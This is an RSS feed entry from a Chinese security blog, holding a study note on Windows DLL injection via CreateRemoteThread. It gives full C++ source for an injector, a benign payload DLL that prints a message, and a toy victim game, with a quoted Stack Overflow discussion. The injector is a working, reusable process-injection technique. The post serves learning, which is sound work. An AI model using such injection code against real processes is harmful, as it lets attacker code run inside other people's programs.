<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>security on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/categories/security/</link><description>Recent content in security on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Mon, 11 Jul 2022 15:10:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/categories/security/index.xml" rel="self" type="application/rss+xml"/><item><title>基于CreateRemoteThread的DLL注入</title><link>https://nnnewb.github.io/blog/p/%E5%9F%BA%E4%BA%8Ecreateremotethread%E7%9A%84dll%E6%B3%A8%E5%85%A5/</link><pubDate>Mon, 11 Jul 2022 15:10:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%9F%BA%E4%BA%8Ecreateremotethread%E7%9A%84dll%E6%B3%A8%E5%85%A5/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>翻到一本Windows编程书上介绍 DLL 注入，简单验证了一下并做个记录。&lt;/p>
&lt;p>同时书上还介绍了另一种代码注入方法，APC 注入，有时间验证了再另写一篇。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>&lt;code>CreateRemoteThread&lt;/code> 注入 DLL 的大体流程如下。&lt;/p>
&lt;ol>
&lt;li>&lt;code>OpenProcess&lt;/code> 打开目标进程，受害进程权限高的话可能要特权。&lt;/li>
&lt;li>&lt;code>VirtualAllocEx&lt;/code> 在目标进程的地址空间里分配足够存放待注入 DLL 路径的空间。&lt;/li>
&lt;li>&lt;code>WriteProcessMemory&lt;/code> 在目标进程写 DLL 路径，位置是上一步分配好的地址。&lt;/li>
&lt;li>&lt;code>GetProcAddress(GetModuleHandle(&amp;quot;kernel32.dll&amp;quot;), &amp;quot;LoadLibraryA&amp;quot;)&lt;/code> 待调用函数地址。&lt;/li>
&lt;li>&lt;code>CreateRemoteThread&lt;/code> 在目标进程里启动线程，线程入口就是 &lt;code>LoadLibraryA&lt;/code>。&lt;/li>
&lt;/ol>
&lt;p>整个流程就是在目标进程的地址空间里写好参数（1~3步），然后调一个已经存在于目标进程地址空间中的函数（&lt;code>kernel32.dll&lt;/code>里的&lt;code>LoadLibraryA&lt;/code>）加载我们的 DLL（4~5步）。&lt;/p>
&lt;p>其中有个坑值得注意下：&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://stackoverflow.com/questions/22750112/dll-injection-with-createremotethread" target="_blank" rel="noopener"
>DLL injection with CreateRemoteThread - stackoverflow&lt;/a>&lt;/p>
&lt;p>The thing confuses me is that &lt;code>GetProcAddress&lt;/code> returns the &lt;code>LoadLibraryA&lt;/code> fucntion address of &lt;strong>the current process&lt;/strong>, how can you pass it as a parameter to &lt;code>CreateRemoteThread&lt;/code> and expect &lt;strong>the target process&lt;/strong> to run it?&lt;/p>
&lt;p>accepted answer:&lt;/p>
&lt;blockquote>
&lt;p>It works by accident. It is a &lt;em>very&lt;/em> common accident, Microsoft makes a great deal of effort to ensure that the operating system DLLs, like kernel32.dll, have a base address that doesn&amp;rsquo;t conflict with any other DLLs. Further enhanced by kernel32.dll getting loaded very early at process initialization so low odds that it has to fight to get its preferred base address.&lt;/p>
&lt;p>You&amp;rsquo;ll get away with easily. It is notable that this &lt;strong>has&lt;/strong> gone wrong in the past, there was an XP security update oops that caused gdi32.dll to get relocated and made lots of machines fall over at boot. The correct way is fairly painful, CreateToolhelp32Snapshot() + Module32First/Next() to find the relocation offset isn&amp;rsquo;t great joy. Frankly, you probably ought to not do this at all if the operating system is &amp;ldquo;weird&amp;rdquo; like that.&lt;/p>
&lt;/blockquote>
&lt;/blockquote>
&lt;p>在第四步使用 &lt;code>GetProcAddress&lt;/code> 拿到的显然是当前进程地址空间里 &lt;code>LoadLibraryA&lt;/code> 的地址，但另一个进程的地址空间里，&lt;code>LoadLibraryA&lt;/code> 也是在同样的地址上吗？说好的地址空间随机化呢？&lt;/p>
&lt;p>从上面贴出的 stackoverflow 链接里，可以看到相关的讨论。主要就是两个观点：&lt;/p>
&lt;ul>
&lt;li>works by accident (very common accident).&lt;/li>
&lt;li>Microsoft intentionally implemented it.&lt;/li>
&lt;/ul>
&lt;p>没有查找到更权威的说法的情况下暂且按下不谈。&lt;/p>
&lt;h2 id="案例">案例&lt;/h2>
&lt;p>案例分三个部分：&lt;/p>
&lt;ol>
&lt;li>&lt;code>injector&lt;/code>，注入者，负责执行 DLL 注入。&lt;/li>
&lt;li>&lt;code>payload&lt;/code>，待注入的 DLL，里面仅输出一行文字标识注入成功。&lt;/li>
&lt;li>&lt;code>victim&lt;/code>，一个简单的猜数字游戏，在案例中扮演受害者。&lt;/li>
&lt;/ol>
&lt;p>使用 cmake 编译。所有源码如下。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="c1">// injector.cpp
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Psapi.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="n">LPCSTR&lt;/span> &lt;span class="n">libPath&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;D:&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s">repos&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s">windows-codeinjection&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s">build&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s">Debug&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s">payload.dll&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="c1">// 从命令行读被注入进程的ID
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">pid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cin&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;invalid pid input&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 打开被注入进程
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">hProcess&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">OpenProcess&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">PROCESS_ALL_ACCESS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">hProcess&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 在目标进程里分配存放 DLL 路径的空间
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">LPVOID&lt;/span> &lt;span class="n">lpRemoteDllName&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">VirtualAllocEx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hProcess&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libPath&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MEM_COMMIT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_READWRITE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">lpRemoteDllName&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;[ERROR] VirtualAllocEx failed, last error &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">GetLastError&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 写入 DLL 路径
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">WriteProcessMemory&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hProcess&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">lpRemoteDllName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">libPath&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libPath&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;[ERROR] WriteProcessMemory failed, last error &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">GetLastError&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 从本进程地址空间读取 LoadLibraryA 函数的地址
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">LPVOID&lt;/span> &lt;span class="n">lpProcAddr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">LPVOID&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetModuleHandle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;kernel32.dll&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s">&amp;#34;LoadLibraryA&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 在目标进程创建线程，执行 LoadLibraryA(我们的DLL路径)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">hThread&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">CreateRemoteThread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hProcess&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">LPTHREAD_START_ROUTINE&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">lpProcAddr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">LPVOID&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">lpRemoteDllName&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 收尾
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">WaitForSingleObject&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hThread&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">INFINITE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">WAIT_OBJECT_0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">CloseHandle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hProcess&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">exitCode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">GetExitCodeThread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hThread&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">exitCode&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;thread exit with code &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">exitCode&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">CloseHandle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hProcess&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="c1">// victim.cpp
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;cmath&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">guess&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">rand&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">pid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GetCurrentProcessId&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;current process id: &amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">pid&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(;;)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cin&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">guess&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">guess&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;too big&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">guess&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;too small&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;correct!&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="c1">// payload.cpp
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;Windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="n">BOOL&lt;/span> &lt;span class="n">WINAPI&lt;/span> &lt;span class="nf">DllMain&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="n">HINSTANCE&lt;/span> &lt;span class="n">hinstDLL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// handle to DLL module
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">fdwReason&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// reason for calling function
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">LPVOID&lt;/span> &lt;span class="n">lpReserved&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// reserved
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="c1">// Perform actions based on the reason for calling.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">fdwReason&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">DLL_PROCESS_ATTACH&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// Initialize once for each new process.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// Return FALSE to fail DLL load.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;dll injected!&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">DLL_THREAD_ATTACH&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// Do thread-specific initialization.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">DLL_THREAD_DETACH&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// Do thread-specific cleanup.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nl">DLL_PROCESS_DETACH&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="c1">// Perform any necessary cleanup.
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">TRUE&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// Successful DLL_PROCESS_ATTACH.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
